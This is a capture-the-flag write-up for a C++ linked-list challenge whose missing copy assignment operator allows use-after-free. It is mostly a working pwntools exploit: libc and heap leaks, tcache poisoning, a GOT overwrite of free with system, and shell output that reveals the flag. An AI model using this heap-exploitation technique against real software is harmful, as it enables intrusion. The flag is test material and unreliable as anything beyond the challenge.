# DS Homework

**Author** : Lazar Mancic  
**Difficulty** : <font color='orange'>Medium</font>  
**Description**: 
I recently got my first data structures homework and I finished it very quickly, but when I sent it in for review the professor told me that I didn't listen during the lecture on special member functions in C++. He said that someone could hack my app, can you do it?

**Flag**: `SCC{n3v3r_f0r637_70_0v3rl04d_c0py_45516nm3n7_0p3r470r!}`

## Solution

Application is vulnerable in operation `8 - Copy one LinkedList into another LinkedList`, because copy assignment operator isn't overloaded for `LinkedList` class. After copying list, one list can be freed and other can be used for Use-After-Free.
```py
from pwn import *

p = remote('localhost', 1338)
libc = ELF('./libc.so.6')
libcpp = ELF('./libstdc++.so.6.0.30')


def mangle(addr, store):
    return addr ^ (store >> 12)


def unmangle(addr):
    for i in range(5, -1, -1):
        x = (addr & (0xFF << 8*i)) >> 12
        addr ^= x
    return addr


# Allocatiing 8 chunks so after freeing them 7 goes to tcache and 1 go to unsorted bin
for _ in range(8):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b">> ", b"0")
    p.sendlineafter(b">> ", b"50")
    p.sendlineafter(b">> ", b"Lazar")
    p.sendlineafter(b">> ", b"Mancic")

# Copying list to another list to get UAF
p.sendlineafter(b">> ", b"8")
p.sendlineafter(b">> ", b"0")
p.sendlineafter(b">> ", b"1")

# Freeing chunks to get libc info leak from unsorted bin
p.sendlineafter(b">> ", b"9")
p.sendlineafter(b">> ", b"0")

# Printing list to get info leak for head and libc
p.sendlineafter(b">> ", b"7")
p.sendlineafter(b">> ", b"1")

p.recvuntil(b"Id: ")
libc_leak = int(p.recvuntil(b", Name", True)) - 0x21ace0

for _ in range(7):
    p.recvuntil(b"Id: ")
heap_leak = (int(p.recvuntil(b", Name", True)) << 12) - 0x12000

log.success(f"Libc leak: {libc_leak:#x}")
log.success(f"Heap leak: {heap_leak:#x}")

libc.address = libc_leak
libcpp.address = libc_leak + 0x229000

# Tcache poisoning to get write into libstdc++ free GOT entry
# delete in libstdc++ calles free in libc
p.sendlineafter(b">> ", b"6")
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b">> ", str(mangle(libcpp.got['free'] - 8, heap_leak + 0x11eb0)).encode())
p.sendlineafter(b">> ", b"Lazar")
p.sendlineafter(b">> ", b"Mancic")

# Allocating one chunk to put /bin/sh on heap
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b">> ", b"2")
p.sendlineafter(b">> ", str(u64(b"/bin/sh\x00")).encode())
p.sendlineafter(b">> ", b"Lazar")
p.sendlineafter(b">> ", b"Mancic")

# Offsets for other GOT entries in libstdc++ around free
offsets = [0x9b860, -0x183c20, 0x9b880, 0x9b890, 0x9b8a0, 0x9b8b0, 0x9b8c0, 0x9b8d0, 0x9b8e0, -0x8b820, 0x9b900, 0x9b910, 0x9b920, 0x9b930, 0x9b940, 0x9b950,
           0x9b960, 0x9b970, 0x9b980, 0x9b990, 0x9b9a0, 0x9b9b0, 0x9b9c0, 0x9b9d0, 0x9b9e0, 0x9b9f0, 0x9ba00, 0x9ba10, 0x9ba20, 0x9ba30, 0xcde00, 0x9ba50, 0x9ba60]

first_bytes = b"".join(p64(libcpp.address + i) for i in offsets[2:17])
second_bytes = b"".join(p64(libcpp.address + i) for i in offsets[17:])

# Writing system insted of free
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b">> ", b"2")
p.sendlineafter(b">> ", str(libcpp.address + offsets[0]).encode())
p.sendlineafter(b">> ", p64(libc.sym['system']) + first_bytes[:-1])
p.sendlineafter(b">> ", second_bytes[:-1])

# Freeing /bin/sh chunk to get shell
p.sendlineafter(b">> ", b"4")
p.sendlineafter(b">> ", b"2")

p.interactive()
```
```
[+] Opening connection to localhost on port 1337: Done
[+] Libc leak: 0x7f4b051ba000
[+] Heap leak: 0x55a39a033000
[*] Switching to interactive mode
$ ls
flag.txt
run
source.cpp
$ cat flag.txt
SCC{n3v3r_f0r637_70_0v3rl04d_c0py_45516nm3n7_0p3r470r!}
```
